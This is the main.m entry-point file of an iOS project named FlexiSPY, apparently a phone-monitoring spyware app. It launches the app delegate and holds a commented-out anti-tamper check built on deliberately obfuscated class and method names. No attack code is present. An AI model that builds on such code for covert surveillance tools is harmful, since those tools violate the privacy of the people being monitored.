//
//  main.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/1/11.
//  Copyright __MyCompanyName__ 2011. All rights reserved.
//

#import <UIKit/UIKit.h>

#import "AppEngine.h"
#import "MobileSPYAppDelegate.h"
#import "FKMBGIIB6.h"

int main(int argc, char *argv[]) {
    NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
    int retVal = 0;
    
//    /* --------------------- Security Check ---------------- */
//    
//    FKMBGIIB6 *sMgr = [[FKMBGIIB6 alloc] init];
//    [sMgr setCffos3:0];
//    [sMgr setCffms3:512];
//    
//    BOOL binaryCorrupted = NO;
//    
//    if (![sMgr fcffe3]) {
//        DLog(@"ifConfigFileExists = NO");
//        binaryCorrupted = YES;
//    }
//    
//    if (!binaryCorrupted && ![sMgr vetl3:@"." cfi:1]) {
//        DLog(@"verifyExecutable = NO");
//        binaryCorrupted = YES;
//    }
//    [sMgr release];
//    
//    DLog(@"Binary currupted = %d", binaryCorrupted);
//    
//    /* --------------------- Security Check ---------------- */
//    
//    if (!binaryCorrupted) {
//        // Get parameter
//        
//    }
    
    retVal = UIApplicationMain(argc, argv, nil, NSStringFromClass([MobileSPYAppDelegate class]));
    
    [pool release];

    
    return retVal;
}
